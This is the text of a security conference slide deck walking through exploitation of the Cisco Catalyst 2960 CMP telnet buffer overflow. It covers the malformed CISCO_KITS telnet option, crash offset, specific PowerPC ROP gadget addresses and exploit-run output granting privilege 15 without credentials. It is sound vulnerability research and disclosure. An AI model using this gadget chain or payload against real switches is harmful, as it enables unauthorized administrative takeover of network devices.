Cisco Catalyst 
Exploitation
Artem Kondratenko
Whoami
-Penetration tester @ Kaspersky Lab
-Hacker
-OSC(P|E)
-Skydiver  ;) 
Cisco advisory
Cisco advisory
• The Cluster Management Protocol utilizes Telnet 
internally as a signaling and command protocol between 
cluster members. The vulnerability is due to the 
combination of two factors:
• The failure to restrict the use of CMP-specific Telnet 
options only to internal, local communications between 
cluster members and instead accept and process such 
options over any Telnet connection to an affected device, 
and
• The incorrect processing of malformed CMP-specific 
Telnet options.
Cisco advisory
. 
Vault 7: Hacking Tools Revealed
Hacking techniques and potential exploit descriptions for 
multiple vendors:
• Microsoft
• Apple
• Cisco
Cisco switch exploit
Codename: ROCEM
Vault 7: CIA Hacking Tools Revealed
Rocem: Modes of Interaction
• Set
• Unset
• Interactive Mode
Easy enough
• Take two switches
• Cluster dem switches!
• Look for a magic whatever there is in the traffic
• ???
• Profit!!
Clustering Cisco switches
Controlling Slave-switches from Master
$ telnet 192.168.88.10
catalyst1#rcommand 1
catalyst2#show priv
Current privilege level is 15
Clustering Catalyst switches
For real?
Clustering Cisco switches: L2 telnet
Magic telnet option
Telnet Debug log from Vault 
ROCEM testing notes
Telnet commands and options
All Hope Is Lost
Replaying CISCO_KITS option during generic telnet session 
doesn’t work 
And also...
Cisco IPS rule for this vuln is called “Cisco IOS CMP Buffer 
Overflow”
Peeking at firmware
The firmware is available at the flash partition of the 
switch:
catalyst2#dir flash:
Directory of flash:/
2  -rwx
9771282   Mar 1 1993 00:13:28 +00:00  c2960-lanbasek9-mz.122-
55.SE1.bin
3  -rwx
2487   Mar 1 1993 00:01:53 +00:00  config.text
4  -rwx
3096   Mar 1 1993 00:09:27 +00:00  multiple-fs
Peeking at firmware
$ binwalk -e c2960-lanbasek9-mz.122-55.SE1.bin 
DECIMAL       HEXADECIMAL     DESCRIPTION
---------------------------------------------------------------
-----------------
1120x70            bzip2 compressed data, block size = 900k
Unpacked binary size is around 30 mb
The Reality 
Jokes aside
• CPU Architecture: PowerPC 32 bit big-endian
• Entry point at 0x3000 (obvious during device boot process 
if you look at it via serial)
Discovering functions with IDA python
Result: 
~80k 
functions
discovered
Aww.. the pain of static analysis
• No symbols.. Well, of course
• The whole OS is a single binary
• Indirect function call via function call tables filled at run 
time
Setting up debug environment
• There’s no public SDK
• Some firmware has a “gdb kernel” command. 
• Custom gdb server protocol
• Unsupported by modern versions of gdb
Two options:
• Dig up an old gdb version and try to patch it
• Use IODIDE 
George Nosenko built an IDA adapter to debug IOS but it’s 
not public
So I patched GDB…
IODIDE –
the smooth 
experience
Well.. Had to debug 
IODIDE to be able to 
debug IOS
IODIDE
Hunting for string XREFS
After recognizing functions and strings with IDAPython
XREFS start to appear:
Digging deeper
CISCO_KITS
Client side send a string:
«\x03CISCO_KITS\x012::1:»
Second string modifier %s –
was observed empty in the 
traffic dump
Let’s take a closer look at 
the code that parses this 
string
CISCO_KITS
Copying until “:” to the buffer residing on the 
stack..
Buffalo overflow!
from pwn import *
payload = cyclic_metasploit(200)
sock.send(payload)
cyclic_metasploit_find(pc)
Crash – instruction pointer is overwritten by a 116th byte
Too easy?
• R9 points to our buffer
• No bad chars
• Wow, that looks to good to be true
• Just overwrite Program Counter with an instruction that 
jump to R9
Fail
• Both heap and stack are non-executable. Btw, stack 
resides on the heap ;)
• Device reboot
• But why?
A little flashback
• A brilliant talk by Felix @ BlackHat
Return oriented programing
• Code reuse in the binary
• Using stack as the data source
r
Epilog chaining to perform arbitrary 
memory writes
Typical function epilog in the firmware
Looking for gadgets
• https://github.com/sashs/Ropper
Ok, whatever dude... But whatcha
gonna write?
First thing that comes to mind – patch the execution flow, 
responsible for the credential check.
Wow… Looks like it worked:
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.
catalyst1>
Not quite
Works only under the debugger. Exception is triggered 
when trying to exploit the live set-up
More static analysis
• A couple of hours (days?) later...
Indirect function calls
Got privileges? No creds required
1st gadget
0x000037b4: 
lwz r0, 0x14(r1)
mtlr r0
lwz r30, 8(r1)
lwz r31, 0xc(r1)
addi r1, r1, 0x10 
blr
1. Put ret address into r0
2. Load data pointed by r1+8 into r30 (is_cluster_mode
func pointer)
3. Load data pointed by r1+0xc into r31 (address of “ret 
1” function)
4. Add 0x10 to stack pointer
5. BLR! We jump to the next gadget
2st gadget
0x00dffbe8: 
stw r31, 0x34(r30)
lwz r0, 0x14(r1)
mtlr r0
lmw r30, 8(r1)
addi r1, r1, 0x10
blr
1. Write r31 contents to memory pointer by 
r30+0x34
2. Move next gadget’s address into r0
3. Junk code
4. Shift stack by 0x10 bytes
5. BLR! Jump to the next gadget
3rd, 4th and 5th gadgets
0x0006788c: 
lwz r9, 8(r1)
lwz r3, 0x2c(r9)
lwz r0, 0x14(r1)
mtlr r0
addi r1, r1, 0x10
blr
1. r3 = *(0x2c + *(r1+8))  - address of 
pointer to get_privilege_level func
2. R31 = *(r1 + 8) – r31  conteints address 
of function that always return 15
3. Overwrite the pointer
0x006ba128: 
lwz r31, 8(r1)
lwz r30, 0xc(r1)
addi r1, r1, 0x10
lwz r0, 4(r1)
mtlr r0
blr
0x0148e560: 
stw r31, 0(r3)
lwz r0, 0x14(r1)
mtlr r0
lwz r31, 0xc(r1)
addi r1, r1, 0x10
blr
PROFIT!
$ python c2960-lanbasek9-m-12.2.55.se11 192.168.88.10 --set
[+] Connection OK
[+] Recieved bytes from telnet service: '\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f'
[+] Sending cluster option
[+] Setting credless privilege 15 authentication
[+] All done
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.
catalyst1#show priv
Current privilege level is 15
Side note
• These switch models are common on pentests
• Successfully exploited this vulnerability on real life 
engagements:
• Leak firmware version via SNMP
• Customize exploit
• Enjoy your shell
Conclusion
• Exploitation challenges:
• Shellcode reliability for multiple firmware versions
• Automating the search for suitable ROP gadgets
• Finding a way execute arbitrary PPC instructions instead of 
arbitrary memory writes 
Thanks!
@artkond
artkond.com